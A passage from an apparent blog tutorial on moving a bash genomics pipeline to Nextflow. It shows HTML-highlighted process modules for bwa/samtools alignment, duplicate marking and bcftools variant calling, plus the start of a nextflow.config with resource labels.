plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.bam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    # Seed control: bwa uses thread-based order</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    # To maintain determinism, use single-threaded or</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    # use sorted output from samtools</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    bwa mem \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        -t </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">cpus</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">reference</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">reads</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> | \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        samtools sort \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">            -@ </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">cpus</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">            -o </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.bam \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">            -</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    # Verify output</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    samtools view -c </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        bwa: \$(echo \$(bwa 2&gt;&amp;1) | sed 's/^.*Version: //; s/Contact:.*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        samtools: \$(echo \$(samtools --version 2&gt;&amp;1) | sed 's/^.*samtools //; s/Using.*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// modules/mark_duplicates.nf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process MARK_DUPLICATES </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.id"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_medium'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'community.wave.seqera.io/library/samtools:1.18'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*marked.bam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    # samtools markdup is deterministic when input is sorted</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    samtools markdup \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        -M \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">bam</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.marked.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        samtools: \$(echo \$(samtools --version 2&gt;&amp;1) | sed 's/^.*samtools //; s/Using.*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// modules/call_variants.nf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process CALL_VARIANTS </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.id"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_medium'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'community.wave.seqera.io/library/bcftools:1.18'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path reference</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.vcf"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    # bcftools is deterministic when output format is sorted</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    bcftools mpileup \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        -f </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">reference</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">bam</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> | \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        bcftools call \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">            -m \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">            -o </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.variants.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    # Sort VCF for reproducibility</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    vcf-sort </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.variants.vcf &gt; </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.variants.sorted.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    mv </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.variants.sorted.vcf </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.variants.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        bcftools: \$(echo \$(bcftools --version 2&gt;&amp;1) | sed 's/^.*bcftools //; s/ .*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="22-create-the-main-workflow">2.2 Create the Main Workflow<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#22-create-the-main-workflow" class="hash-link" aria-label="Direct link to 2.2 Create the Main Workflow" title="Direct link to 2.2 Create the Main Workflow" translate="no">​</a></h3>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// nextflow.config</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    shell </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'/bin/bash'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-euo'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'pipefail'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> process_high </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">GB </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        time </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">h </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> process_medium </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span 